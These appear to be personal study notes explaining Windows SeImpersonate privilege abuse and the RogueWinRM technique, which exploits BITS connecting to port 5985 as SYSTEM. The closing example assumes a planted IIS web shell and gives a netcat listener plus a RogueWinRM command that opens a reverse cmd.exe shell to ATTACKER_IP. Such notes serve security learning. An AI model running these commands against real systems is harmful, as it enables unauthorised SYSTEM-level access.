These privileges allow a process to ***impersonate other users and act on their behalf***. Impersonation usually consists of being ***able to spawn a process or thread*** under the security context of another user.

Impersonation allows services like an FTP server to act as individual users (e.g., Ann's account) instead of the service account (e.g., ftp account). 

Without impersonation, services need broad file access and must manage their own authorization, increasing complexity and risk. 
[[Pasted image 20250324171910.png]]

With `SeImpersonate` or `SeAssignPrimaryToken` privileges, ***services (e.g., ftp account) can use the access token of authenticated users***.
[[Pasted image 20250324171944.png]]

Attackers who compromise a service with these privileges can impersonate users connecting to it. Common accounts like `LOCAL SERVICE`, `NETWORK SERVICE`, and `iis apppool\defaultapppool` have these privileges by default.

To escalate privileges, attackers must:
- Spawn a process that users connect to.
- Trick privileged users into authenticating to it.

`RogueWinRM` achieves both by ***exploiting Windows BITS (Background Intelligent Transfer Service) service behaviour***: When BITS starts, it ***connects to port 5985 as SYSTEM***. If WinRM isn't running, ***attackers can run `RogueWinRM` on port 5985 to catch this connection*** and execute commands as SYSTEM using SeImpersonate privileges.
	Note: `BITS is a Windows service used to transfer files in the background, like downloading Windows updates or syncing files.`

**Example**
Let's assume, we've compromised a website running on IIS and that we have planted a web shell on the following address:
```
http://IP
```

Use the web shell to check for the privileges:
	`whoami /priv`

Start a netcat listener:
```
nc -nvlp 4444
```

User our web shell to trigger the `RogueWinRM` exploit:
```
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4444"
```
